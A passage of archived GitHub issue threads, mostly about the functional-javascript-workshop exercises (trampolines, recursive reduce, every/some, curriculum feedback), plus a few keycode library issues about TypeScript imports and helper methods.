   Going off of other sources where I was reading about this, I arrived at a solution that uses bind() to ensure that the recursive call execution is deferred until trampoline invokes it within the loop. However, the official solution did not seem to need this to prevent the stack overflow and I am not sure why. &#13;
&#13;
   I think I get the main point that each step of the recursion should be executing rather than setting up a bunch of placeholders until we get to the base case, but with the resources and instructions provided, I was not as clear on why the stack overflow would be happening and how this solution prevents it&#13;
&#13;
Here was my solution which worked but seems to have unnecessary elements to it: &#13;
&#13;
```javascript&#13;
function repeat(operation, num) {&#13;
  // Modify this so it doesn't cause a stack overflow!&#13;
  if (num &lt;= 0) return&#13;
  operation()&#13;
  return repeat.bind(null, operation, --num)&#13;
}&#13;
&#13;
function trampoline(fn) {&#13;
  while(fn &amp;&amp; fn instanceof Function) {&#13;
    fn = fn()&#13;
  }&#13;
  return fn&#13;
  // You probably want to implement a trampoline!&#13;
}&#13;
&#13;
module.exports = function(operation, num) {&#13;
  // You probably want to call your trampoline here!&#13;
  return trampoline(repeat.bind(null, operation, num))&#13;
}&#13;
```&#13;
&#13;
and for contrast the official solution: &#13;
&#13;
```javascript&#13;
function repeat(operation, num) {&#13;
      return function() {&#13;
        if (num &lt;= 0) return&#13;
        operation()&#13;
        return repeat(operation, --num)&#13;
      }&#13;
    }&#13;
&#13;
    function trampoline(fn) {&#13;
      while(fn &amp;&amp; typeof fn === 'function') {&#13;
        fn = fn()&#13;
      }&#13;
    }&#13;
&#13;
    module.exports = function(operation, num) {&#13;
      trampoline(function() {&#13;
        return repeat(operation, num)&#13;
      })&#13;
    }&#13;
```</Body>
    </Comment>
  </Issue_368>
  <Issue_369>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Basic: Every Some, more efficent solution</Title>
    <Owner>timoxley</Owner>
    <Body>Just working through your workshop. Thank you for creating it.

I stumbled across a solution which I think is actually more efficient - as soon as one bad user is found, it exits, rather than processing every single submittedUser:

```
module.exports = function checkUsersValid(goodUsers) {
  return function(submittedUsers) {
      return !submittedUsers.some(function(submittedUser){
          return !goodUsers.some(function(goodUser){
              return goodUser.id == submittedUser.id
          })
      })
  };
}
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>This is great! Shame on me for not thinking of this. 

Though, the point of the exercise is to get people to learn/use every/some though&#8230; can you think of another example that would require the use of both?
</Body>
    </Comment>
    <Comment>
      <Owner>superdweebie</Owner>
      <Body>I think `every` is superfluous. The only time you would use `every` instead of a `!some` is if the function has some kind of external effect, like `console.log(item)`, which sort of goes against the whole functional programming mentality. Or to put it another way, if all you care about is the return value from an `every` or a `some` then it's always better to use `!some` in place of `every`.
</Body>
    </Comment>
  </Issue_369>
  <Issue_370>
    <Repository>functional-javascript-workshop</Repository>
    <Title>'functional-javascript verify' doesn't check if file exists or not</Title>
    <Owner>timoxley</Owner>
    <Body>I found this out after discovering that I have swapped a '.js' with a ',js'
</Body>
    <State>open</State>
    <Comment>
      <Owner>linclark</Owner>
      <Body>This could be fixed in the process of #58. Most exercises which use v1 have a check, `exercise = filecheck(exercise);`
</Body>
    </Comment>
  </Issue_370>
  <Issue_371>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Basic Recursion: Simpler solution</Title>
    <Owner>timoxley</Owner>
    <Body>I may have found a simpler solution to the recursion problem:

``` JavaScript
function reduce(arr, fn, initial) {
    if (arr.length === 0) {
        return initial;
    }

    return fn(initial, arr.shift(), 0, arr);
}

module.exports = reduce;
```

I'm not sure how this solution compares to the one provided, perhaps it's less efficient, or maybe it doesn't work on all cases, but it makes more sense in my head, mostly because it seems a bit simpler. It also passes the test successfully.

Additionally, I had to read the problem description like 10 times before I thought I understood what was required.
i.e. Part of the description reads: "... and an _initial value which will return an object_ containing the counts for each word found in the array ...".
That sounds like the initial value will return an object? So my first thought was: _is the initial value a function as well?_
Eventually I figured it out. Maybe I'm the only one that struggled with the description, otherwise, perhaps we could improve it slightly? Just a thought...
</Body>
    <State>open</State>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Ahh, your solution only performs a single step. Try this:

``` js
reduce([1,2,3], function(prev, curr) {
  return prev + curr
}, 0)
```

It should output 6.

Sounds like we need a more rigorous test.

And yes, the problem description is a bit tricky too, perhaps we could simplify it to the example I did above, just a simple accumulator as the actual operation isn't important, just that you've figured out how to emulate reduce with recursion correctly
</Body>
    </Comment>
    <Comment>
      <Owner>joyrexus</Owner>
      <Body>Along similar lines, but [this](https://github.com/joyrexus/nodeschool/blob/master/functional-js/problems/basic_recursion/answer-1.coffee) [works](https://github.com/joyrexus/nodeschool/blob/master/functional-js/problems/basic_recursion/test.coffee#L22-L23):

``` javascript

  // reduce `arr` with `reduction` method
  // initialize with `init`
  var reduce = function(arr, reduction, init) {
    if (!arr.length) { return init }              // nothing left to recur over
    var next = arr.shift();                       // shift off first value
    var reduced = reduction(init, next, 0, arr);  // get reduced value
    return reduce(arr, reduction, reduced);       // recur
  };

```
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>@joyrexus I like it, though compared with 'real' reduce, in your solution the index param is always 0.
</Body>
    </Comment>
    <Comment>
      <Owner>joyrexus</Owner>
      <Body>@timoxley ah, true.  We can increment the index, albeit at the expense of concision:

``` javascript
  // reduce `arr` with `reduction` method
  // initialize with `init`
  var reduce = function(arr, reduction, init) {
    var i, next, reduced;
    if (!arr.length) return init                        // nothing left to recur
    if (typeof i === "undefined" || i === null) i = 0   // increment index
    next = arr.shift();                                 // shift off first val
    reduced = reduction(init, next, i + 1, arr);        // get reduced value
    return reduce(arr, reduction, reduced);             // recur
  };
```
</Body>
    </Comment>
    <Comment>
      <Owner>joyrexus</Owner>
      <Body>FWIW, [this elaboration](https://github.com/joyrexus/nodeschool/blob/master/functional-js/problems/basic_recursion/answer-3.js) of [the original solution](https://github.com/timoxley/functional-javascript-workshop/blob/master/problems/basic_recursion/solution.js) (renaming and commenting in the manner of the answer above) helped me better understand what was going on:

``` coffeescript
# reduce `arr` with `reduction` method
# initialize with `init`
reduce = (arr, reduction, init) -&gt;
  max = arr.length - 1        # max of array index
  recur = (i, prev) -&gt;
    return prev if i &gt; max    # return prev value if no more values to recur over
    reduced = reduction(prev, arr[i], i, arr)
    recur(i + 1, reduced)     # recur on next with reduced value
  recur(0, init)              # start recursion
```
</Body>
    </Comment>
    <Comment>
      <Owner>Monocotyledon</Owner>
      <Body>   At a coder meetup last night, I got someone to walk me through the conceptual requirements of recursion, so I simply used 

``` javascript
module.exports = function reduce(arr, fn, initial) {    # setup function w/target, operator, and initial value 
    if (arr.length === 0) {return initial};             # base case, does not recurse
    initial = fn(initial, arr[0]);                      # sets init-OP-first result as new init
    return reduce(arr.slice(1), fn, initial);}          # rightshifts first so arr[0] index is the new current value
```

   Once I submitted it, I found the official solution hard to understand. Though it seems like you write a lot about how recursive functions are generally better and more elegant than loops, the official solution acts in a very looplike manner--it operates by incrementing the value of arr that the function is looking at. It seems like an unnecessarily long and complex method of reducing an array. In my experience, the longer code is, the more likely bugs escape notice and the harder for novices to learn the concept, which seems like your intention with this workshop.
   I also found this exercise difficult to understand because the linked resources didn't include the link for array.prototype.split, which my recommendation would be to add. Actually, as a novice freshly learning this stuff, I could help alter the descriptions of the exercises to be considerably more friendly to complete code-newbies using this workshop. 
-LMM
</Body>
    </Comment>
    <Comment>
      <Owner>joyrexus</Owner>
      <Body>@Monocotyledon:

&gt; Actually, as a novice freshly learning this stuff, I could help alter the descriptions of the exercises to be considerably more friendly to complete code-newbies using this workshop. 

Go for it! I don't think @timoxley is averse to pull requests.
</Body>
    </Comment>
    <Comment>
      <Owner>brookemitchell</Owner>
      <Body>@Monocotyledon Definately like your solution more, I approached it similarly. Its the kind of approach I remember from How to Design Programs for dealing with recursion.
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Thanks for the input, I'm going to have a look at this over the weekend, will get back to you then!
</Body>
    </Comment>
    <Comment>
      <Owner>jakeseltz</Owner>
      <Body>Functional-Javascript-Workshop : Reduce

Wrote out the reduce module as follows. It doesn't handle the undefined (I'm fairly new to javascript and not sure best how to handle the undefined.

```

  function countStrings(inputWords) {

      var list = inputWords.reduce(function(p,c){
        if(c in p){
            p[c]++
        }else{
            p[c]=1;
        }

        return p;

      }, {});
      console.log(list)
    }



    module.exports = countStrings
```
</Body>
    </Comment>
    <Comment>
      <Owner>kierans</Owner>
      <Body>My first attempt at the Basic Recursion exercise was very similar to @Monocotyledon however I defaulted the index value to _fn_ to zero initially.  Running my code through the verification process, my program passed.  Eventually I thought of how to increment the index properly; for the sake of completing the problem properly.  However the verification step should fail if the index isn't correct for each invocation of _fn_ IMO since you're not meeting the requirements.

I'm guessing based on this thread that the calculation of the index is the hardest part of the problem, so feedback for users would also be useful.

I also think the inlining of the function naming/using in the official solution is harder to read, but that might be a personal preference.  Here's my solution:

```
function reduce(arr, fn, initial) {
  function reduceWithCounter(counter, value) {
    if (counter &gt; arr.length - 1) {
      return value;
    }

    return reduceWithCounter(counter + 1, fn(value, arr[counter], counter, arr));
  }

  return reduceWithCounter(0, initial);
}
```
</Body>
    </Comment>
    <Comment>
      <Owner>alex7217</Owner>
      <Body>Hopping onto this issue with a similar feedback to what @kierans and @Monocotyledon said.
1. Awesome workshop so far - really enjoy the format and challenges.
2. When I arrived at  Basic: Recursion, Exercise 7 of 18 - the directions kinda baffled me. I did not understand the part:

&gt; You don't need to implement this functionality, it will be supplied to your reduce implementation.

How or why the code I wrote from the previous exercise would be used exactly was mysterious, and compounded my difficulties to grasp recursion concepts.
1. Finally, like @Monocotyledon said, the official solution I don't think I would have ever arrived at. A hint about IIFE or maybe a previous exercise involving them would help.

TL;DR - The conceptual leap between exercises 6 and 7 may be too great for JavaScript beginners. We need more direct instructions or additional clues about the solution.
</Body>
    </Comment>
    <Comment>
      <Owner>RobBollons</Owner>
      <Body>Just adding to the feedback about this issue. I've enjoyed the exercises so far but the official solution for this one looks a bit messy to me and isn't easy to follow due to the IIFE and the inlining. In the end I got the same solution as @Monocotyledon which I guess by using Array.prototype.slice isn't optimal. I would definitely have needed more pointers about maintaining the index in the recursion like @kierans said.
</Body>
    </Comment>
    <Comment>
      <Owner>LordJohn42</Owner>
      <Body>Attention, spoiler. Official solution. &#13;
```&#13;
function reduce(arr, fn, initial) {&#13;
  return (function reduceOne(index, value) {&#13;
    if (index &gt; arr.length - 1) return value // end condition&#13;
    return reduceOne(index + 1, fn(value, arr[index], index, arr)) // calculate &amp; pass values to next step&#13;
  })(0, initial) // IIFE. kick off recursion with initial values&#13;
}&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>geeksaurav</Owner>
      <Body>&gt; @timoxley ah, true. We can increment the index, albeit at the expense of concision:&#13;
&gt; &#13;
&gt; ```js&#13;
&gt;   // reduce `arr` with `reduction` method&#13;
&gt;   // initialize with `init`&#13;
&gt;   var reduce = function(arr, reduction, init) {&#13;
&gt;     var i, next, reduced;&#13;
&gt;     if (!arr.length) return init                        // nothing left to recur&#13;
&gt;     if (typeof i === "undefined" || i === null) i = 0   // increment index&#13;
&gt;     next = arr.shift();                                 // shift off first val&#13;
&gt;     reduced = reduction(init, next, i + 1, arr);        // get reduced value&#13;
&gt;     return reduce(arr, reduction, reduced);             // recur&#13;
&gt;   };&#13;
&gt; ```&#13;
&#13;
why are you passing arr in the last recursive step [return reduce...] and the function still working. If you do this your base condition shouldn't work.Right?</Body>
    </Comment>
  </Issue_371>
  <Issue_372>
    <Repository>functional-javascript-workshop</Repository>
    <Title>Curriculum Review by @brianloveswords</Title>
    <Owner>timoxley</Owner>
    <Body># Hello World
## Before starting...
- "$input", hmmm confused about this
- "program" or "module"? Should I be exporting a function or writing a
   program that looks at `process.argv`?
- META: there should probably be more explanation as to why I'm
   doing this. I don't yet understand what this has to do with
   functional javascript. NOTE that it doesn't necessarily _have_ to
   do with functional js, but some text saying "hey, this is just to
   get your feet wet, make sure you got the basics, etc" would be great!
## During...
- Okay, I'm trying `process.argv[2]`. I'm getting back a string, but
   that string is wrapped in quotes. That's weird, but maybe okay?
- Verify doesn't like it. It looks like I'm getting the right
   string, but verify wants it without the quotes.
- I guess I'll just `.replace(/"/g, '')` the string, even though I
   know that's not not correct, just so I can see what the solution is.
## After finishing...
- AH okay, so `$input` is a global that gets injected into the
   script. That is weird to me &#8211; I think it'd be better if either
   A) it used (and expected) process.argv[2] OR
   B) it expected a module with exactly one function that does what is expected.
  - But to counter my own point, this is functional _javascript_ not
    functional _node.js_. So maybe the global injection is the right
    move? Not sure...
# Higher Order Functions
## Before starting...
- Ah ha, so I see the global injection is going to be a common
   theme. I don't really like that &#8211; it feels to magical, I like the
   method used in `levelmeup` of building modules or taking things
   on argv. This isn't a dealbreaker by any means, but I think it
   does encourage better real-world practices.
## After finishing...
- Oh, I solved it totally differently:
  
  ``` js
   function repeat(fn, n) {
     if (n &lt;= 0) return;
     fn()
     return repeat(fn, --n)
   }
  
   repeat($operation, 5)
  ```
  
   I do feel like this might be slightly less "clever" &#8211; and it
   teaches good recursion principles (always check your end
   condition first, always make sure your input converges on the end
   condition).
# Basics: Map
## Before starting...
- The introduction could use a little more explanatory text as to
   what a map is and why it's useful &#8211; something like the following:
  
   "We often have to take a set of data and modify it before we
   output it. For example, say we get this back from our database:
   [{first: 'Brian', last: 'Brennan'}, {first: 'Alex', last:
   'Sexton'}]
  
   And we want a list of full names. We can do this with a for loop,
   but we have to manually keep track of indices and push to a new
   array on our own. A better way to handle this is by using a
   `map`. A `map` is a higher order function that operates each
   element of an array and returns a new array with each element
   transformed
  
   So to get our list of full names, our mapping function would be:
   `function fullName(item) { return item.first + ' ' + item.last }`
  
   And we'd call it like so: `var fullNames = entries.map(fullName)`
  
   Notice that the map function returns a new array &#8211; it doesn't
   modify the array in place. This is a very important principle in
   functional programming: it's always better to take input and
   return new output rather than modify things in place.
  
   Your exercise is to take an array of numbers and return a new
   array with each number replaced by itself \* 2..."
## After finishing...
- I think this might be cleaner and help illustrate the power of
   passing function references around
  
  ``` js
   function double(n) { return n * 2 }
   console.log($input.map(double))
  ```
  
   I think the solution could also then explain the power of
   creating small, generically useful functions and then using them
   in maps to transform sets of data.
# Basics: Filter
## Before starting...
- [workshopper] &#8211; is there a way to get code fences working in
   workshopper so that when the instructions are printed out the
   things fenced in ```js are syntax highlighted? (That'd be a rad
   module, and there's like a 90% chance substack has already
   written it).
## After finishing
- Again, I like seperating out the functions rather than using
   anonymous functions:
  
  ``` js
   function isShort(txt) {
     return txt.length &lt; 50
   }
  
   function getMessage(obj) {
     return obj.message
   }
  
   function getShortMessages(arr) {
     return arr.map(getMessage).filter(isShort)
   }
  
   console.log(getShortMessages($input))
  ```
  
   I think it better illustrates composition.
# Basics: Reduce
## Before starting...
- Some illumination for _why_ a reduce is useful would be
   good. Perhaps even something that explains it in terms of mapping:
  
   "A `reduce` (also known as a "fold left") is useful when you want
   to take a bunch of values and turn it into just one. A good
   example of this is taking the sum of a series:
  
  ``` js
   [1,2,3,4,5].reduce(function sum(accum, value){
     return accum + value
   }, 0) // 0 + 1 + 2 + 3 + 4 + 5 = 15
  ```
  
   The first argument to the `reduce` functor is known as the
   `accumulator` &#8211; this keeps track of a value as the functor
   processes values. The second argument to `.reduce` is known as
   the seed value. This is useful for priming the `accumulator` so
   the functor doesn't have to do conditional checking against it to
   see whether or not it's the first value.
  
   It's important to choose the correct seed value for the operation
   you are performing! For example, `0` works well for addition, but
   if we wanted to get the factorial rather than the sum, we would
   want to use `1` instead:
  
  ``` js
   [1,2,3,4,5].reduce(function factorial(accum, value){
     return accum * value
   }, 1) // 1 * 1 * 2 * 3 * 4 * 5 = 120
  ```
  
   (Fun fact: this has to do with 0 being the identity value for the
   addition operation and 1 being the identity value for the
   multiplication operation [citation needed])"
- Woah, the boilerplate is confusing to me! I think to properly
   explain `reduce`, the operation needs to be transparent &#8211; I think
   part of doing `reduce` properly involves selecting the proper
   `seed`. That's an important lesson to teach, and one that gets
   obscured if the operation is opaque. It's also a lesson about
   `reduce` but the boilerplate function says `map`.
  - AH I missed the part "i.e. Use Array#reduce to implement
    Array#map." &#8211; I think this is should be _after_ a basic reduce
    lesson. This is more advanced `reduce`, I think.
## After finishing...
- I felt cheated by the "extra credit". None of the previous
   lessons taught the optional arguments, and the lesson instructions
   didn't say that we were supposed to implement
   `Array.prototype.map` _exactly_. The function signature in the
   "boilerplate" is also indicating that we should only implement
   something with 2-arity.
- Again I think the solution is too clever &#8211; I'm not sure we should
   expect people to understand `fn.call` and `fn.apply` unless we
   make a lesson about it earlier on.
# Partial Application without Bind
## Before starting...
- Should probably explain partial application a little bit
   first. Remind people about higher-order functions and tell them
   that in this case, we want to make a function that takes input and
   returns a new function.
- If people have to do that argument variable "turn to a real array"
   hacking, that might be A) be a bad thing, or B) need to be
   explained.
## After finishing
- Yeah, doing the arguments trick without explanation isn't
   great. This should either be explained in an earlier lesson (along
   with call and apply), or there should be a solution that doesn't
   require it. I vote for the former. Here is my solution for
   reference, though I think the published one is probably better
   because `Array.prototype.concat` is rad and I don't use it nearly
   enough.
  
  ``` js
   function logger(namespace) {
     return function logFn() {
       var args = [].slice.call(arguments)
       args.unshift(namespace)
       return console.log.apply(console, args)
     }
   }
  
   $test(logger)
  ```
# Partial Application with Bind
## Before starting...
- Function arity should be explained (in an earlier lesson)
## After finishing
- Pretty good!
# Function spies
## Before starting...
- I think the purpose of spies &#8211; testing, debugging &#8211; should be
   explained upfront. Also that spies should probably _only_ be used
   for testing, debugging because the behavior is opaque to anyone
   down the line. (I am very open to debate on this issue!)
## After finishing
- Ah, I was confused by the naming &#8211; `Spy` with an uppercase S &#8211; and
   I was expecting to build a constructor. I guess in a way it is?
   I'm torn on this one. My solution was this:
  
  ``` js
   function Spy(object, methodName) {
     if (!(this instanceof Spy))
         return new Spy(object, methodName)
  
     this.count = 0
     var originalFn = object[methodName]
  
     object[methodName] = function secretAgent() {
       this.count++
       return originalFn.apply(object, arguments)
     }.bind(this)
   }
  
   $test(Spy)
  ```
# Conclusion

  This is awesome. I think with some interstitial lessons about `call`
  and `apply`, maybe one about `reduce` before implementing `map` with
  `reduce`, this can be a super rad workshopper! I'm definitely willing
  to help with creating/editing the intro text to add more
  theory/reasons behind _why_ someone would want to use FP techniques in
  JS &#8211; I think that's important. Thank you so much for getting this
  started!
</Body>
    <State>open</State>
    <Comment>
      <Owner>brianloveswords</Owner>
      <Body>ALSO, forgot to make it clear &#8211; I'm totally willing to make some PRs for this stuff. I wanted to review first to get your opinion before I jumped in and started making changes! Let me know which things you think are worth adding/modifying and I'll get on it.
</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>Wow thanks for this feedback, exactly what I was looking for! 

Some of the points you've raised are listed in here: https://github.com/timoxley/functional-javascript-workshop/issues/2

## magical $injection

Injection is horribly magical, but is just as magical as process.argv[n] for someone who doesn't use node, and the tutorial is aimed at non-noders. I'm thinking the export a function and passing in the arguments would work pretty well and wouldn't require too much noise, and reduces the magic. I'll refactor.

## Meta Info

I relied a bit on being able to physically talk people through each lesson. Definitely needs more explanation about what the purpose of each lesson is and some more detail about how to work the functions. Understanding how reduce worked at all was particularly difficult for many.

## Repeat Solution

Agreed, the recursive solution is better. Perhaps an introduction to recursion should occur prior, or perhaps this could be 'higher order functions &amp; recursion' with some more introductory text.

## Map

The point here was to give a minimal example to help people connect the for-loops + accumulator array pattern with maps&#8230; As in, "any time you see this pattern, it's a good case for using map". People are very attached to their for-loops, even after I told them not to use them, people kept writing them! I'm thinking I need to use esprima to parse their code and fail on any for-loops. I'm happy to change the exercise to operating over an array of objects, as that's probably more real-worldy.

## Filter

I have a feeling it wouldn't be hard to implement fences, even if it just changed the colour and indented it.

## Reduce

Yeah this one was a bit tricky on multiple fronts. Everyone stumbled on the "extra credit" and I've removed it and added a simpler reduce example (available on master branch). And I'll introduce apply/call/arity on their own in a prior exercise.

## Partial Application without Bind

Yep, the arguments -&gt; real array thing needs explaining. Sounds like it could fit well into the apply/call/arity exercise.

## Spy

I find myself using this pattern for monkey patching bad behaviour of other libraries. Good practice? probably not. But it's easier/safer than running/depending on my own fork.

Capitalisation is a pattern I'm seeing recently (e.g. [MuxDemux examples](https://github.com/dominictarr/mux-demux)) where the capitalisation simply means, 'this is a factory', rather than 'this is a constructor', which I guess is a specific type of factory.

## Conclusion

Thanks a lot for your detailed feedback!
Please go ahead and add your meta explanations in, they all read well, I like. I think refactoring the $magic into a simple module.exports = function() { } is a pretty good idea, I'll most likely change that.
</Body>
    </Comment>
    <Comment>
      <Owner>magwitch</Owner>
      <Body>I was going to send this as an email until I found this discussion:

Firstly can I to take the opportunity say how much I have enjoyed working through (most) of your node school module. If I have appeared critical on the forum I apologise. Some of the exercises I have found frustrating but mostly at my own inability to work out the solution. I know you have extended an extraordinary amount of time and effort in putting this module together and for that I offer a big thank-you.

I have learnt a lot of tips and techniques so far and, looking at your solutions, which are always neat, concise and very elegant, your knowledge of JavaScript is clearly at a level that John Resig terms Ninja Master. I am certainly trying to emulate your style in my own coding. I also suspect, from the way the exercises have jumped forward, that you're one of those people that can sketch out the solution to a complex maths problem in 3 lines whereas it would take someone like me about 10.

That said, I would like to offer a few suggestions for the module.

### Higher Order Functions

Having worked through all of the `learnyounode` module and half of `stream-adventure`, one of the things that is very noticeable is the way that the student's answer receives it's input from`workshopper`. In the other modules it is always a single item; url query string, file path, some kind of stream, etc. In some of your exercises though, the input is doubled.

The second exercise, `Higher Order Functions`, introduces the student to the concept of a function `receiving` a function as an input, but then we don't require a higher order function solution again until `Basic: Every Some`. At this point we require a function that `returns` a function. This latter exercise not only introduces a new type of functional programming but also provides the student with a basic framework that `will be required` for future exercises. So, in that light...

##### a) Basic: Every Some

I wonder whether the introduction to this module might not be changed to something like:

&gt; In lesson 2: Higher order functions, we implemented a function that receives another function as it's input. Here you will be required to implement a function that returns a second function that will also receive input. This framework of higher order functions to receive 2 sets of input will be an important coding paradigm for completing future lessons.

##### b) Partial Application without Bind / Partial Application with Bind

Then, when we get to the later lessons of Partial Application without Bind and Partial Application with Bind the current instructions of "Your implementation should take a namespace string, and return a function that prints
messages to the console with the namespace prepended." might refer the student back to Basic: Every Some.

&gt; In the lesson Basic: Every Some you were introduced to the concept of a higher order function that returned a second function to be invoked with further arguments. Here your implementation should be a function that accepts a namespace string and returns a function that takes a message which should then be printed to the console with the namespace prepended

Also, I found the implementation a little confusing in that I was expecting first: a namespace, then second: a series of sentence strings. Instead it appears that the implementation is a single namespace then a series of words that need to be concatenated to form the sentence.

under Arguments I feel this could described as:

&gt; "The arguments to the returned function are a series of words which will need to be combined to form the message body."

A similar description for the implementation and second input could be applied to Partial Application with Bind.

### Basic: Reduce

I personally found the number of new concepts introduced in this exercise to be a bit overwhelming. The previous lesson, `Basic: Every Some` introduced the student to a number of Array methods and encouraged them to investigate the return from each function in order introduce the concept of chaining methods together. The problem with `Basic: Reduce`, as I mentioned in my forum posting, is your very clever and unique use of the `Array#reduce` method as a form of iterator. In addition, the exercise also introduces a new concept of the data cache.

I wonder whether an intermediate exercise might not assist the student in gaining insight into iteration and caching. Say, `Basic: Iterator with Cache.` Essentially do the `Basic: Reduce` exercise using any form of loop the student chooses but introducing loops as a way of iterating over an array and storing the results of the loop function in a data cache.

Then, once the student understands the concepts of caching and iteration, introduce `Basic: Reduce` with 

&gt; "Task: Given an Array of strings, use the concepts of data caching and array iteration from the previous exercise to implement Array#reduce to create an object that contains the number of times each string occurred in the array. Return the object directly (no need to console.log)."

The student may not be familiar with how`Array#reduce` actually works. I certainly found it difficult to conceive how to  get such a reduction algorithm to store data. So, under hints it might say.

&gt; "Consider using a data cache as the optional second parameter to the reduce() callback. Consider that the reduce() method works by taking the first 2 items of the array and replaces them with the single item returned from the callback"`

### Partial with Bind

I personally struggled to get my head around apply(), call() and, in particular bind(). As with `Basic: Reduce` I felt the leap from `Partial without Bind` to `Partial with Bind` too great, especially considering the solution you were after. Not least that it requires the student to be aware of the concept of `Console` as a global object. Again, might I suggest an intermediate step which, in a way, was how I completed this exercise in such a verbose fashion. If one considers `Object#bind` as a kind of recipe then we need 3 ingredients: a function we wish to bind, and object to bind it to and some additional arguments to spice things up as required. Perhaps you could return to the Basic: Call exercise and duck counting with the property 'quack' and structure an intermediate exercise:

&gt; "Implement a function that accepts a number of arguments; an animal,  it's associated sound and possibly additional qualities. Create an animal object and a separate function literal that outputs the name of each animal with it's associated sound. Use Object#bind in the form function.bind(object, arguments).
&gt; Hint: binding a function to an object returns a new function."

The other difficulty I found in analysing your solution was the use of the Console object. Returning `"console.log.bind(console, namespace)"` appears as if you're using a method from the same object that you're binding the method to. If the student is still at the `function.bind(obj, args)` stage, like me, then this is rocket-science stuff. Also, many students will be unaware that Console is actually a global object with it's own methods. The Console object also seems unique in that if you use `console.log.apply(console, arguments)` it prints out the arguments but not if you just use `console.log(arguments)` which gives them as an object with numbers as keys. Like your solution to Partial with Bind, this construct looks as if it's applying an object's own method to itself.

### Partial without Bind

Following on from above. Your solution to this exercise makes use of the `console.log.apply(console, ..)` concept. Neither of the two links which are given as references explain how you would use the Console object in this way. On a personal note, I found I was looking for a way to use `Object#apply` to manipulate the incoming data not as a way to structure my output. Again, without wishing to make this module too big, perhaps there's room for an exercise around the Console object.
For example, Tom Ashworth, one of the mentors at the node school meet-up references this construct in his article `"useful js call and apply"` http://phuu.net/2012/11/16/useful-js-currying-and-bind.html

"Let&#8217;s say you&#8217;re passing a callback to someone else&#8217;s library and you&#8217;re expecting data back, but you don&#8217;t know how many arguments you&#8217;re going to get. There&#8217;s a simple trick to allow you to console.log everything that&#8217;s passed to your callback.

```
var args = [].slice.call(arguments, 0);
console.log.apply(console, args);
```

"Because apply takes an array of arguments to be passed to the function, you can sling it the array of arguments you received and have them logged out, all nicely formatted."

The use of `Array.prototype.slice` is introduced in `Basic: Call` although the narrative for that exercise is already quite long enough without introducing the Console object. Dare I suggest yet another exercise around the Console object? Sadly, I can't think of any useful implementation off hand.

I hope this has been of some use. I still have 7 more exercises to complete and will report back at the end.
</Body>
    </Comment>
    <Comment>
      <Owner>samjewell</Owner>
      <Body>Hi @timoxley - thanks for an awesome workshop.
Have you had another curriculum review since this one? Sounds like you've probably taken on a lot of the original comments and fixed a bunch of things...
I've got about halfway through the workshop, and written a few notes on things I think could be improved, so I could easily share them in the same way (in this or another issue).

In the meantime, just wanted to put in my responses to the comments above.

# Hello World

loving the way you've now set up each exercise to export a function. Much prefer this to the process.argv[n] option, as I think it is closer to what I'm dealing with on a daily basis.

I'm a slightly more experienced coder, so I found the first few exercises fairly easy, the middle ones harder, and haven't finished the last ones yet.

# Map

agree that the solution could also look like this:

```
function double(n) { return n * 2 }
 console.log($input.map(double))
```

could you show both options in the solution, so people can see that they are equivalent, and just use different styles?

Tim - you mention "any time you see this pattern, it's a good case for using map" here in this issue - put that into the exercise itself too - either in the problem or solution text.

# Filter

_Again, I like seperating out the functions rather than using
anonymous functions:_
I like how you've named your function in place inside Array.map call - we always try to do this in order to make the error messages and stack trace more meaningful. Maybe you can add a little part explaining the benefits of this?
+1 for illustrating reduce with summing and with doing a factorial, to explain the seed value.

# Partial application without bind

I also really struggled to concatenate a string onto the front of an array properly - took me ages and loads of trial and error. I also think it might be nice to put this stuff into a separate exercise.

# Conclusion

Tim you've asked @brianloveswords to add in the meta descriptions, but he hasn't put them in yet has he? Shall we go ahead and do this?

# Lastly

@timoxley what are your thoughts about putting in any of the changes that @magwitch has suggested? I agree that the pace of learning is fast, often with multiple concepts to be understood between exercises. Would just be good to hear your response to their comments.
I also would like encouragement to type `console.log(console)` into the node REPL - it took me a long time before I did this, but it was a real eye opener to understand that it was just a global object!

## Ps.

I seem to have ground to a halt around exercises "Implement Map with Reduce" and "function spies", and I can't see any other users comments or issues around the later exercises. Are a lot of people dropping out of the workshop before they reach the end, do you know? Is there any way we can track the point at which people drop out, or stop making progress?

## Pps.

How do you feel about using ascii art for when you complete a workshop? https://github.com/eiriksm/workshopper-hooray
</Body>
    </Comment>
  </Issue_372>
  <Issue_373>
    <Repository>keycode</Repository>
    <Title>Does not work with TypeScript ES modules</Title>
    <Owner>timoxley</Owner>
    <Body>```typescript&#13;
// in TypeScript&#13;
import * as keycode from 'keycode';&#13;
```&#13;
&#13;
The code above results in `error TS2307: Cannot find module 'keycode'.`&#13;
&#13;
The `tsc` version is v2.4.1.</Body>
    <State>open</State>
    <Comment>
      <Owner>nkint</Owner>
      <Body>here too with ts 2.6.2, npm 5.3.0</Body>
    </Comment>
    <Comment>
      <Owner>wachunga</Owner>
      <Body>Works fine for me, typescript 2.6.1.&#13;
```ts&#13;
import keycode from 'keycode';&#13;
```</Body>
    </Comment>
  </Issue_373>
  <Issue_374>
    <Repository>keycode</Repository>
    <Title>`isModifier` and other helper methods</Title>
    <Owner>timoxley</Owner>
    <Body>Please add `isModifier`, `isFunctional` and `isPrintable` helper methods. It's very useful, when you write a library or add shortcuts support.</Body>
    <State>open</State>
    <Comment>
      <Owner>the-spyke</Owner>
      <Body>I don't mind submit PR myself :-)</Body>
    </Comment>
    <Comment>
      <Owner>timoxley</Owner>
      <Body>&gt; I don't mind submit PR myself :-)&#13;
&#13;
please do &#129351; </Body>
    </Comment>
  </Issue_374>
  <Issue_375>
    <Repository>keycode</Repository>
    <Title>Add a list of all supported strings in one spot</Title>
    <Owner>timoxley</Owner>
    <Body>It would be nice to have a definitive list of all the key codes available.&#13;
&#13;
I generated this from the `codes` object:&#13;
https://gist.github.com/mimshwright/7b23464d7f63065400af319d04e7df6d</Body>
    <State>open</State>
    <Comment>
      <Owner>jonscottclark</Owner>
      <Body>@mimshwright Thanks :)</Body>
    </Comment>
  </Issue_375>
  <Issue_376>
    <Repository>keycode</Repository>
